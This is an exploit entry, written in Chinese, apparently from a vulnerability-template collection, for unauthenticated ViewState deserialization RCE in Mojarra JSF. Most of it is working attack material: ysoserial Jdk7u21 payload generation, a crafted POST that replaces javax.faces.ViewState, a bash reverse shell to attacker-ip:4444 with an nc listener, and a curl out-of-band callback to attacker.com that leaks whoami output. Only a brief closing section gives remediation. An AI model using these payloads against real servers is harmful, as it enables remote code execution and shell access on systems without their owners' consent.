---
id: MOJARRA-JSF-VIEWSTATE-DESERIALIZATION
title: Mojarra JSF ViewState 反序列化漏洞
product: mojarra
vendor: Mojarra
version_affected: "<2.1.29-08, <2.0.11-04"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["Mojarra", "JSF"]
---

## 漏洞描述

JavaServer Faces (JSF) 是一种用于构建 Web 应用程序的标准，Mojarra是实现了JSF的框架。在其2.1.29-08、2.0.11-04版本之前，没有对JSF中的ViewState进行加密。攻击者可以构造恶意的序列化ViewState对象对服务器进行攻击。

## 影响版本

- Mojarra 2.1.29-08 之前
- Mojarra 2.0.11-04 之前

## 前置条件

- 无需认证
- 目标使用 Mojarra JSF 框架

## 利用步骤

1. 使用 ysoserial 生成 Jdk7u21 利用链 payload
2. 提交表单并拦截请求
3. 将 ViewState 参数值替换为恶意 payload

## Payload

```bash
# 生成 payload（使用 ysoserial Jdk7u21）
java -jar ysoserial.jar Jdk7u21 "touch /tmp/success" | gzip | base64 -w 0
```

```http
# 提交时替换 ViewState 参数
POST /faces/page.jsf HTTP/1.1
Host: target:8080

javax.faces.ViewState=<base64_encoded_payload>
```

## 验证方法

```bash
# 此漏洞为ViewState deserialization RCE，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 生成反弹shell payload
PAYLOAD=$(java -jar ysoserial.jar Jdk7u21 "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" | gzip | base64 -w 0)

# 提交表单时替换ViewState
curl -X POST "http://target:8080/faces/page.jsf" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "javax.faces.ViewState=${PAYLOAD}"

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
PAYLOAD=$(java -jar ysoserial.jar Jdk7u21 "curl http://attacker.com/$(whoami)" | gzip | base64 -w 0)
curl -X POST "http://target:8080/faces/page.jsf" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "javax.faces.ViewState=${PAYLOAD}"
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 升级 Mojarra 至 2.1.29-08 或 2.0.11-04 及更高版本
2. 启用 ViewState 加密
3. 升级 JDK 至最新版本
